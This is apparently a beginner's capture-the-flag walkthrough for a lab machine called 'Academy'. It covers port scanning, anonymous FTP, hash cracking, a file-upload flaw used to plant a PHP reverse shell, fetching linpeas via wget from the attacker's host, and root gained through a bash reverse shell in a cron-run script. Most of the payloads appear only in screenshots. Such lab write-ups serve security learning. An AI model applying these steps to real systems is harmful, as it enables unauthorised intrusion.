This machine is one of the first machines i got root access to. It was really fun and this is going to be like a walkthrough to it.
Advice to beginners just like me, I won't advise you follow this walkthrough back to back as it will rnot really help you progress well in your journey. You can just come here to check when you get stuck and have tried all possible things you know before.

First we load our machine and get our IP address. For that we use the command <ip a> and we copy our IP address. That will be the target IP. 
![image](https://github.com/Bangis041/academy-/assets/74382096/9c438e88-5791-4089-83fe-921446e9cc60)


We start by doing the normal, scanning for ports to see which ports are opened and vulnerable. For this, I did a nmap scan with SYNTAX: <nmap -A -p- IP>
![image](https://github.com/Bangis041/academy-/assets/74382096/3d764b7f-820c-41d3-b1d1-34811b658b62)

From the scan above, we can see we had a number of opened ports. Port 21, 22 and 80. Port 21 looked interesting since it's the first and has a content we would like to view and also, anonymous FTP login allowed.
We go ahead to check out what ftp has for us. For that we use <ftp IP> and then we are able to list what files are there. FTP simply means file transfer protocol, it is used to download, upload, and transfer files from one location to another on the internet and between systems.
![image](https://github.com/Bangis041/academy-/assets/74382096/d07f7c83-9256-4046-a6b6-6cf56a21cb1e)


Here we downloaded the note.txt file using <get file-name> and then I viewed it on my attacker's machine. From the note.txt, we found out Grimmie was a user and dev who uses same passwords everwhere hehe😂 and we also found a SQL database where we saw the student RegNo, passwords and all other things that can be used to login. It was also from 2020 and the message was from jdelta.

After that we check out the next port that might matter to us. SSH is not it so we move down to port 80.
Just paste the IP on your browser and check round for any useful information. After loading the website, there was no much information. we only knew what technology was behind it.
![image](https://github.com/Bangis041/academy-/assets/74382096/53b38ac7-4519-4202-90c5-ca4b81d25de3)
Here we proceed to using a directory buster. I will be using gobuster in this instance. SYNTAX: <gobuster dir -u http://IP -w wordlist_file/path>.
![image](https://github.com/Bangis041/academy-/assets/74382096/bdcf9185-6b31-4618-b9a2-1d6e827a3332)

Afer scanning we were able to get two directories. One interests me more and that is /academy. Why? Because I saw something that has to do with student in the note.txt file we saw from FTP. Now we search for http://IP/academy. After loading, we get to see a login page that requires us to use a REG NO and password. I did that and i got an error ![image](https://github.com/Bangis041/academy-/assets/74382096/3282bcab-4f23-4414-895c-ded129a73056)
 so i looked at the password again and realized it was not a password but a hash. Most students used weak passwords😂. I simply used https://crackstation.net to crack the password and it was "student" so i logged in and said to myself "I'm IN !!!" hehe.
![image](https://github.com/Bangis041/academy-/assets/74382096/64a793e0-cdc9-4e1b-8199-4617a0b93152)

Nothing was looking interesting here, just the 'My Profile' page. I uploaded a photo there and it went successful and then i tried to upload a file that was neither .jpg or .png format and it went. I smiled and said to myself, I am in that mode already with one kind of evil smile on my face. The plan here was to create a reverse shell and see if we can gain access. I simply go to google and search for php reverse shell. It bring out one pentestmonkey githb, i moved in there and saw a sweet code i can work with. i copied the entire code and used nano to create a .php file. I named it shell.php. SYNTAX: <nano <file_name>.php>. Read the code and change what needs to be changed, upload and listen. Once again guys.... I'm in!!!. I tried running <sudo -l> to check if i gain root access, it gave an error. So then i realised i needed to use an automation tool i learnt about on https://tryhackme.com/r/room/linprivesc. Simply go to google and search 'linpeas'. I found the script, ![image](https://github.com/Bangis041/academy-/assets/74382096/2437bec1-dff5-49ae-9557-dd9d001422cb)
i copied and pasted in a .sh file i named linpeas. Now i have to transfer the file to the shell by hosting a webserver ad using wget. since I am transferrig from my machine to the target's mahine, i use <wget http://MY_IP/file> ![image](https://github.com/Bangis041/academy-/assets/74382096/040247fa-141e-4d1f-ab19-828aaee7d1f8). Now is time to change the permission to make it executable and then run!!!. 
![image](https://github.com/Bangis041/academy-/assets/74382096/269bb845-d796-4154-81b7-ddd10c3906ee)
We were given what to look out for also...made work easier. While scrolling through, I was able to get this...* * * * * /home/grimmie/backup.sh and also this 👇
![image](https://github.com/Bangis041/academy-/assets/74382096/a4edae2d-e509-426d-990c-a40d80c03c68) and also a password that kept repeating itself in multiple instances. I think now is time i use port 22 which is SSH since we have confirmed that Grimmie is a user and we have a possible password. SYNTAX for SSH: <ssh user@IP> and guess what again guys...I'm in🥱. 

![image](https://github.com/Bangis041/academy-/assets/74382096/481ae434-82a8-40db-bdd9-f84eac966f9d)
Now it's looking like it's a dead end after trying sudo -l. I checked the content of backupsh and realised it supposed to run at some point. Crontabs did not work so i used ps aux to list processes and we can see it is running as root user. Maybe we are correct.
![image](https://github.com/Bangis041/academy-/assets/74382096/94de302c-2c28-410a-b51c-a7f04ad8f0ee). 

From here, we head over to google.com as it is out best friend to ask it asbout "bash reverse shell one liner" and we see a link on pentestmonkey. 
![image](https://github.com/Bangis041/academy-/assets/74382096/319e4683-a49a-43a1-82a7-01a53a3994f6)

We get a command to use to get a shell...Let's try it and see what comes.
![image](https://github.com/Bangis041/academy-/assets/74382096/17267a78-6af2-4561-85c6-37bd8fb39fd1).

For this to work, we have to set up a listener on our machine and specify the port we are listening on. For me it is 5678. ![image](https://github.com/Bangis041/academy-/assets/74382096/198043da-f221-4a9a-b9eb-19b27c9805e3).
We then wait for it to run, I waited for about 28seconds and I AM IN!!!!!

![image](https://github.com/Bangis041/academy-/assets/74382096/5203fc05-b3bb-44bf-8590-abcfcb7113e3)
Just find the flag and at it out. 
![image](https://github.com/Bangis041/academy-/assets/74382096/b87492b2-0a0e-47d5-b436-275268df8453)

